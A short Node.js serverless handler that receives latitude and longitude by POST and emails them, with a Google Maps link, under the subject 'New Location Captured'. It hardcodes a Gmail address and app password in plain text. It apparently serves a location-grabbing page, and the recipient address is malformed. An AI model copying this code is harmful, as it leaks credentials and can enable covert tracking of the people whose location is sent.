const nodemailer = require("nodemailer");

export default async function handler(req, res) {
  if (req.method === "POST") {
    const { lat, lon } = req.body;

    // DEBUG: Log location to Vercel logs
    console.log(`📍 Location received: Latitude = ${lat}, Longitude = ${lon}`);

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "muhfaizan7861230@gmail.com",
        pass: "zpoh xsor kfga fzsx" // Your Gmail App Password
      }
    });

    const mailOptions = {
      from: "muhfaizan7861230@gmail.com",
      to: "bc230203320mfa.vu.edu.pk", // Your VU email
      subject: "📍 New Location Captured",
      text: `Latitude: ${lat}\nLongitude: ${lon}\n\nGoogle Maps: https://www.google.com/maps?q=${lat},${lon}`
    };

    try {
      await transporter.sendMail(mailOptions);
      console.log("✅ Email sent to VU email successfully!");
      res.status(200).json({ success: true });
    } catch (error) {
      console.error("❌ Email failed to send:", error);
      res.status(500).json({ success: false, error: error.message });
    }
  } else {
    res.status(405).json({ error: "Method Not Allowed" });
  }
}
